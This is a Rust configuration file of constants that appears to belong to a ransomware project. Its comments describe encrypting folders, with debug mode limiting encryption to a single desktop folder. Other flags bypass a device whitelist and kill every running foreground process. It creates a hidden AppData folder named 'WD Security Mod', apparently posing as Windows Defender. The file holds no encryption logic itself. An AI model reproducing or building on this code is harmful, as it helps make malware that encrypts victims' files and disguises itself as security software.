/// toggle debug mode
/// 
/// doing this will:
/// - run the test checks at the start of the process 
/// - still hide the main folder, but it will be visible if the setting to show hidden files is enabled
pub const DEBUG_MODE: bool = false;

/// the folder on the desktop that will be the only thing encrypted when in debug mode
pub const DEBUG_FOLDER_NAME: &str = "wr-dbg-fld";

/// bypasses the device whitelist check
pub const DEBUG_BYPASS_WHITELIST: bool = false;

/// whether it will kill every running foreground procs
pub const DEBUG_CAN_KILL_PROCS: bool = true;

/// the name of the folder that will be created in AppData/Local
pub const MAIN_FOLDER_NAME: &str = "WD Security Mod";
